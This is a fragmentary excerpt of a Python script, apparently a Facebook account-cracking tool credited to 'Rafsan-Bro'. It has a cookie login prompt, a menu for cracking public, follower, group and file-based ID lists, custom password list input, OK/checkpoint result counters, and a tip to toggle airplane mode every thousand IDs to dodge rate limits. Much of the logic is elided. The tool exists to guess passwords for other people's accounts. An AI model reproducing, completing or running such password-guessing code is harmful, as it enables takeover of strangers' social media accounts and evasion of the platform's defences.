...
\t/.' _/ |`'=/ " \='`| \_ `.\
\t/` .' `\;-,'\___/',-;/` '. '\
			{m}•{k}•{h}•{sir} Author : Rafsan-Bro {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tCookies invalid  : [red]Cookies Need[red] Cookies Error'))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}1{x}] Pest Cookies :{asu} ')
		...
		print(f'  {x}[{h}•{x}]{h} LOGIN AGAIN!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	gh = 'github.com/ RafsanBro-XD'
	cetak(nel('\tName : [yellow]%s[white] Rafsan Bro'%(my_name)))
	print(f'>> Your Idz : '+str(my_id))
	print(f'>> Your Ip  : {ip}')
	print(f'>> Github   : {gh}')
	print('')
	print('>> 1. Crack Public(recommended) ')
	print('>> 2. Crack Follower ')
	print('>> 3. Crack Group   ')
	print('>> 4. Crack File 	')
	print('>> 5. Result Crack  ')
	print('>> 0. cokis logout       ')
...
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('/sdcard/RAFSAN-DUMP')
	except FileNotFoundError:
		print('>> File  Not Fund ')
		time.sleep(2)
		back()
...
#		method.append('touch')
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Choose password minimam 6 word\n[[cyan]•[white]] Ex :[green] rafsn,rafsanb,rafs[white] '))
		pwku=input('>> Choose pw : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} START {m}•{k}•{h}•{x} <<<<< ')
	print('')
	print(f'>> Rslt {h}OK{x} Id : {h}OK/%s {x}'%(okc))
	print(f'>> Rslt {k}CP{x} Id : {k}CP/%s {x}'%(cpc))
	print(f'>> Airplane mode aftar {m}1k{x} Idz\n')
...
if __name__=='__main__':
	...
	alvino_xy(f'\n\t{x}——> {h}Assalamuwalaikum\n\t{x}——> {h}Welcome 🖤🌻\n\t{x}——> {h}Codz Rafsan\n\t{x}——> {h}Fb-Rafsan Bro\n\t{x}——> {h}Github-Rafsan-Xd{x}')
	time.sleep(3)
	login()
